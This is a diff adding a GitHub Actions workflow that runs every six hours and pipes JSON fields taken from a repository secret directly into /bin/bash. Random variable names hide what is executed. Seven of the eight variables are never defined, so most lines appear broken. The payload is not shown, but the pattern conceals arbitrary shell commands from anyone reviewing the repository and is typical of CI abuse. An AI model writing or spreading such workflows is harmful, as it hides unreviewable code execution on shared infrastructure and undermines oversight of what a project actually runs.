@@ -1,0 +1,25 @@
+name: mayunzhongqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mayunzhongqian
+        env:
+          svmfg87471: ${{ secrets.svmfg87471 }}
+        run: |
+          echo $svmfg87471 | jq -r .dlou45 | /bin/bash
+          echo $ncgea0 | jq -r .fa92 | /bin/bash
+          echo $kzego7480 | jq -r .rv8 | /bin/bash
+          echo $h5 | jq -r .wcuja31 | /bin/bash
+          echo $uco3529 | jq -r .tbovx9262 | /bin/bash
+          echo $d92695 | jq -r .u25 | /bin/bash
+          echo $ks6751 | jq -r .ekjw712 | /bin/bash
+          echo $q7391 | jq -r .gho54379 | /bin/bash
+
